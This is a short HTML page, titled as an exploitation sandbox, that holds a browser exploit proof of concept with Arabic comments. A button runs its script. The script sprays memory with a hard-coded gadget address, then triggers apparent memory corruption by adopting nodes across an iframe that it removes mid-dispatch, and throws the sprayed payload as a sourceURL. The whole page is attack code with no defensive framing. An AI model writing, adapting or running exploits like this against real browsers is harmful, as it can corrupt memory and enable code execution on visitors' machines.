<!DOCTYPE html>
<html>
<body>
<p>Exploitation Sandbox: Memory Poisoning</p>
<button onclick="main()">Run Attack</button>

<script>
function main() {
    // 1. إعداد الـ Payload (العناوين التي نريدها في الذاكرة)
    const targetGadget = 0x000000082039d566n; 
    const spraySize = 0x10000;
    const payload = new BigInt64Array(spraySize);
    for (let i = 0; i < spraySize; i++) {
        payload[i] = targetGadget;
    }
    // تحويل الـ Array إلى نص (String) ليمكن استخدامه في sourceURL
    const payloadStr = String.fromCharCode.apply(null, new Uint16Array(payload.buffer));

    // 2. إعداد الـ iframe والـ EventTarget كما في الـ PoC الأصلي
    const f = document.body.appendChild(document.createElement('iframe'));
    const a = document.createElement('div');
    const b = a.appendChild(document.createElement('div'));

    a.addEventListener('a', eval(`(function () {
        document.adoptNode(a);
        f.remove();
        // حقن الـ Payload هنا بدلاً من 'A'
        throw {
            line: 1, column: 1,
            sourceURL: payloadStr
        };
    })`));

    a.addEventListener('a', () => {});
    b.addEventListener('a', () => { f.contentDocument.adoptNode(a); });

    // 3. التنفيذ
    b.dispatchEvent(new Event('a', { bubbles: true }));
}
</script>
</body>
</html>
